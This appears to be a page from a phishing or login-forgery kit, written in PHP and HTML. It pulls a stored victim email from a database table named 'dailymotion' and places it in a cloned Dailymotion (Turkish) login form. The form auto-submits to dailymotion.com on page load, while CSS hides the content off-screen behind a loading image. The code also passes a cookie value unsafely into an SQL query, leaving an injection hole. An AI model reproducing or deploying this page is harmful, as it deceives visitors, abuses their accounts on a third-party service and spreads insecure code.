<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `dailymotion` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["login_form"].submit();}</script>



<form action="http://www.dailymotion.com/pageitem/login?urlback=%2Ftr&amp;request=%2Flogin%3Frequest%3D%2F" class="dmco_form_container dmco_form dmpi_login column span-4 last nd dmco_form ajax" id="login_form" method="post">
<div style="display:none">
<input class="dmco_form_input dmco_form_hidden " id="form_name" name="form_name" type="hidden" value="dm_pageitem_login">
</div>
<h2 class="dmco_title popup_title">Oturum aç:<span class="action_alternative">veya <a class="dmco_simplelink name dmco_link action:popup" href="http://www.dailymotion.com/pageitem/registerFull?mode=basic&amp;request=%2Flogin%3Frequest%3D%2F&amp;ajax_rnd=1360413856469&amp;from_request=%2Ftr" title="Bir hesap oluştur" onClick="DM_Ajax.link(this); return false;">Bir hesap oluştur</a></span></h2>
<div class="form_item " id="login_form_username_cont">
<div class="form_input  check rule_required ">
<span onClick="$(this).next().focus();" class="input_hint" style="display: block;">E-posta veya kullanıcı adı</span><input class="dmco_form_input dmco_form_text  check rule_required  text" data-hint="E-posta veya kullanıcı adı" data-focus="" id="login_form_username" name="username" type="text" value="<?=$email;?>">
</div>
</div>
<div class="form_item " id="login_form_password_cont">
<div class="form_input  check rule_required ">
<span onClick="$(this).next().focus();" class="input_hint" style="display: block;">Şifre</span><input class="dmco_form_input dmco_form_password  check rule_required  password" data-hint="Şifre" id="login_form_password" name="password" type="password">
</div>
</div>
<a class="dmco_simplelink forgot_password name dmco_link not_ajax" tabindex="-1" target="_self" href="/password/recover" title="Şifrenizi mi unuttunuz?">Şifrenizi mi unuttunuz?</a>
<div class="dmco_clear"><!--comment for IE6 height --></div>
<div class="form_item " id="login_form_login_submit_cont">
<div class="form_input ">
<input class="dmco_form_input dmco_form_submit button_blue button_big button short_input " id="login_form_login_submit" type="submit" name="login_submit" value="Üye Girişi">
</div>
</div>
<div class="dmco_clear"><!--comment for IE6 height --></div>
</form>

</body>
</html>

